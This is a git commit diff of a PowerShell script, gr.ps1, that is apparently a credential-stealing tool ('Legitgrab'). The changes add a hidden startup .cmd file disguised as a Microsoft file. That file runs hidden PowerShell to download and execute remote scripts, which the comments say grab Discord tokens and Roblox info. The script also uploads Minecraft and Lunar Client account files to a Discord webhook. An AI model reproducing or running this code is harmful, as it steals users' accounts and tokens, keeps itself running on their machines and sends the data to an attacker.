a33603cbb9083d6630a8032ef07a9a7b4607fe56
Appolon24800 <93398824+Appolon24800@users.noreply.github.com>
2023-01-17 21:05:18 +0100

    rewrite

--- gr.ps1
+++ gr.ps1
@@ -1,4 +1,4 @@
-#$webHookUrl='for dev ! '
+#$webHookUrl='for dev xD'
 #####################################################################
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
 $webHookUrlPYTHON2="""$webHookUrl"""
@@ -14,10 +14,13 @@ $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity
 
 
 #####################################################################
+
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/g.ps1).content)
 "
+attrib +h "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd"
+
 #####################################################################
 
 #####################################################################
@@ -65,7 +68,8 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $webHookUr
 
 ######################################################################
 [System.Collections.ArrayList]$embedArray = @()
-$thumbUrl = 'https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png' 
+$thumbUrl = 'https://cdn.discordapp.com/attachments/1055506901812650034/1064993265549590608/image.png' 
+#https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png
 $thumbnailObject = [PSCustomObject]@{
 	
     url = $thumbUrl
@@ -96,32 +100,35 @@ $payload = [PSCustomObject]@{
 
 ######################################################################
 
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID.ps1).content)
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID.ps1).content)
 #For grab discord tokens
 
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID_gen.ps1).content)
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_gen.ps1).content)
 #For grab roblox info/tokens
 
-#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID_use.ps1).content)
+#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_use.ps1).content)
 #For grab all cookies (thx to https://github.com/Smug246/Luna-Token-Grabber)
 #NOT IMPLEMENTED
 
-#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/UUID_utils.ps1).content)
+#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_utils.ps1).content)
 #For idk lol
 
 ######################################################################
 
+
 Upload-Discord -text "||@everyone||"
+powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.py
+Start-Sleep -Seconds 3
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
-python C:\Windows\Temp\Win.microsoft.Security.temp\UUID.ps1
+powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID.py
+Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
-python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.ps1
-#python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.ps1
-#python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.ps1
+#powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.py
+#powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.py
 
 ######################################################################
 
